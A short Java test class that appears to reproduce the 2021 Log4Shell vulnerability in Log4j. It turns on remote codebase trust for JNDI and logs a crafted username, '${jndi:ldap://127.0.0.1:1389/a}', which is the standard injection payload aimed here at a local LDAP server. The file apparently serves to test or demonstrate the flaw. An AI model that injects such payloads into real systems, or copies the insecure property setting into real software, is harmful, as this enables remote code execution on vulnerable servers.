import java.io.IOException;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @author zhouxinghang
 * @date 2021/12/10
 */
public class Test {
    private static final Logger log = LogManager.getLogger(Test.class);

    public static void main(String[] args)  {
        log.error("${java:os}");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        String username = "${jndi:ldap://127.0.0.1:1389/a}";
        log.error("username: {}",username);
    }

}
